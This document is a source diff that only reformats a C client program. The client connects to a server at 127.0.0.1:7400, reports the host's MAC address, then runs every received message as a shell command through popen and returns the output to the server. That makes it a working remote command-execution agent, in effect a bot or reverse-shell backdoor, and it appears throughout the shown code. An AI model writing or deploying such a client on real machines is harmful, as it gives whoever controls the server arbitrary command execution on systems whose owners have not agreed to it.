@@ -1,4 +1,3 @@
-#include "util.h"
 #include <arpa/inet.h>
 #include <dirent.h>
 #include <linux/if.h>
@@ -14,7 +13,9 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-FILE *recv_exec_msg(int sockfd, char msg[], int msg_size) {
+#include "util.h"
+
+FILE* recv_exec_msg(int sockfd, char msg[], int msg_size) {
   /* Receive and process messages from the server */
   int bytes_received = recv(sockfd, msg, msg_size, 0);
 
@@ -23,10 +24,10 @@ FILE *recv_exec_msg(int sockfd, char msg[], int msg_size) {
   } else if (bytes_received == 0) {
     error_and_exit("Server disconnected \n");
   } else {
-    msg[bytes_received] = '\0'; // Null-terminate the received message
+    msg[bytes_received] = '\0';  // Null-terminate the received message
     printf("%s\n", msg);
     // Process the received  message here (e.g., execute commands)
-    FILE *output_pipe = popen(msg, "r");
+    FILE* output_pipe = popen(msg, "r");
     if (!output_pipe) {
       error_and_exit("Error Executing Commands \n");
     }
@@ -35,12 +36,12 @@ FILE *recv_exec_msg(int sockfd, char msg[], int msg_size) {
   }
 }
 
-char *find_devices(char path[]) {
-  struct dirent *de; // Pointer for directory entry
+char* find_devices(char path[]) {
+  struct dirent* de;  // Pointer for directory entry
   char network_interface[20];
 
   // opendir() returns a pointer of DIR type.
-  DIR *dr = opendir(path);
+  DIR* dr = opendir(path);
 
   // Error Checking
   if (dr == NULL) {
@@ -72,21 +73,20 @@ int mac_address(char interface[], char addr[]) {
   }
   strcpy(s.ifr_name, interface);
   if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
-    addr[0] = '\0'; // Initialize addr as an empty string
+    addr[0] = '\0';  // Initialize addr as an empty string
     for (int i = 0; i < 6; ++i) {
       sprintf(temp, "%02X", (unsigned char)s.ifr_hwaddr.sa_data[i]);
       strcat(addr, temp);
     }
-    close(fd); // Close the socket
+    close(fd);  // Close the socket
     return 0;
   }
 
-  close(fd); // Close the socket
-  return -1; // Didn't work.
+  close(fd);  // Close the socket
+  return -1;  // Didn't work.
 }
 
 int main() {
-
   int MSG_SIZE = 4096;
   int MYPORT = 7400;
   char HOSTNAME[] = "127.0.0.1";
@@ -97,7 +97,7 @@ int main() {
   int sockfd = open_tcp_socket();
 
   /* Get server's IP address */
-  struct hostent *server = gethostbyname(HOSTNAME);
+  struct hostent* server = gethostbyname(HOSTNAME);
   if (server == NULL) {
     error_and_exit("Error: No such host \n");
   }
@@ -105,7 +105,7 @@ int main() {
   struct sockaddr_in serv_addr = {
       .sin_family = AF_INET,
       .sin_port = (in_port_t)htons(MYPORT),
-      .sin_addr = *(struct in_addr *)*server->h_addr_list,
+      .sin_addr = *(struct in_addr*)*server->h_addr_list,
   };
 
   printf("Trying to connect to %s \n", HOSTNAME);
@@ -117,11 +117,11 @@ int main() {
 
   printf("Connected to server.\n");
   char msg[MSG_SIZE];
-  char output_buffer[MSG_SIZE]; // Adjust buffer size as needed
-  char result_buffer[MSG_SIZE]; // Initialize an empty string buffer
+  char output_buffer[MSG_SIZE];  // Adjust buffer size as needed
+  char result_buffer[MSG_SIZE];  // Initialize an empty string buffer
 
   // Send MAC Address Once
-  char *wl_interface = find_devices("/sys/class/net");
+  char* wl_interface = find_devices("/sys/class/net");
   char mac_addr[12];
   if (mac_address(wl_interface, mac_addr) == -1) {
     printf("Failed to get MAC Address");
@@ -133,20 +133,19 @@ int main() {
   }
 
   while (1) {
-
     testfds = clientfds;
     select(FD_SETSIZE, &testfds, NULL, NULL, NULL);
     for (int fd = 0; fd < FD_SETSIZE; fd++) {
       if (FD_ISSET(fd, &testfds) && fd == sockfd) {
         // Process the received message here (e.g., execute commands)
-        FILE *output_pipe = recv_exec_msg(sockfd, msg, MSG_SIZE);
+        FILE* output_pipe = recv_exec_msg(sockfd, msg, MSG_SIZE);
         memset(result_buffer, 0,
-               strlen(result_buffer)); // clear result_buffer
+               strlen(result_buffer));  // clear result_buffer
         // Read the output of the command and send it back to the server
         while (fgets(output_buffer, sizeof(output_buffer), output_pipe) !=
                NULL) {
           strcat(result_buffer,
-                 output_buffer); // Append each line to the result buffer
+                 output_buffer);  // Append each line to the result buffer
         }
 
         printf("%s \n", result_buffer);
@@ -157,7 +156,7 @@ int main() {
           close(sockfd);
           error_and_exit("Error sending response to server\n");
         }
-        fflush(stdout); // Ensure the data is sent immediately
+        fflush(stdout);  // Ensure the data is sent immediately
         pclose(output_pipe);
       }
     }
